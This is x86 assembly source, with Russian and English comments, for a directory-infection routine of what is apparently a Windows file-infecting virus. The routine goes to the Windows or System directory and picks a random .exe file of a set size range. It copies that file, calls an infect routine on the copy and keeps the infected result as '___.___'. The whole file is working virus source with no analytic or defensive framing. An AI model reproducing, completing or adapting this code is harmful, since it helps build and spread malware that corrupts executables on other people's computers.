locals __
locals @@
__x	equ rec

infectdir:
	cld
	push 0
	pop [yes]
	rdtsc
	and eax, 1fh
	mov [try], eax
	mov ax, ds
	cmp ax, 100h
	jl win_nt
	; переходим в каталог винды
	; go to win dir
	lea eax, [tempdir]
	push 255
	push eax
	xcall GetWindowsDirectoryA
	jmp __43462
win_nt:
	; переходим в системный каталог 
	; go to sys dir
	lea eax, [tempdir]
	push 255
	push eax
	xcall GetSystemDirectoryA
__43462:
	lea esi, [tempdir]
	push esi
	xcall SetCurrentDirectoryA


	; find first file 
	; mask
IF NORELEASE EQ 1
;	push 'd'
;	push 'zm.*'
	push 'e'
	push 'xe.*'
ENDIF

IF RELEASE EQ 1
	push 'e'
	push 'xe.*'
ENDIF

__00:
	mov ecx, esp
	lea eax, [fdata]
	push eax
	push ecx
	xcall FindFirstFileA
	add esp, 8
	mov [hfind], eax


	; if file is not found, change directory
	cmp eax,-1
	jz infd_fail1

gofile:
	cmp [yes], 0
	jnz infd_ok
	cmp [fdata].fd_lsize, 130000
	jg findnextone
	cmp [fdata].fd_lsize, 30000
	jl findnextone
	dec [try]	; суперизящное решение! ;)
	jnz findnextone
	
	lea esi, [fdata].fd_fname
	lea edi, [tempdirl]
	mov ecx, MAX_PATH-1
	rep movsb

	lea eax, [tempdirl]
	mov 1 ptr [eax], '_'	

	; copy file.exe to _ile.exe
	push 0
	push eax
	lea eax, [fdata].fd_fname
	push eax
	xcall CopyFileA
	or eax, eax
	jz findnextone

;nop 
;int 3

	mov 1 ptr [fdata].fd_fname, '_'	; меняем первый символ файла 
									; infect _ile.exe
	
	mov [success], 0
	call infect

	cmp [success], 0
	jnz __succesful

	push 1
	pop [try]
	jmp continue_search

__succesful:
	; if infected copy '_ile.exe' to '___.___'
	lea edi, [tempdir]
	mov eax, '___.'
	stosd
	mov eax, '___'
	stosd

	push 1
	pop [yes]

	lea edi, [tempdir]
	lea esi, [tempdirl]
	push 0
	push edi
	push esi
	xcall CopyFileA

    
continue_search:
;	push 100
;	xcall Sleep ; slowing-down

	; delete _ile.exe
	lea eax, [fdata].fd_fname
	push eax
	xcall DeleteFileA


	; next file
findnextone:


	lea eax, [fdata]
	push eax
	push dword ptr [hfind]
	xcall FindNextFileA

	or eax,eax
	jnz gofile

	cmp [yes], 0
	jnz infd_ok

	; nothing found
infd_fail2:
	push [hfind]
	xcall FindClose
	sub eax, eax
	ret

infd_ok:
	push [hfind]
	xcall FindClose
	lea eax, [tempdir];[fdata].fd_fname
	ret
infd_fail1:
	sub eax, eax
	ret ; end of directory infection
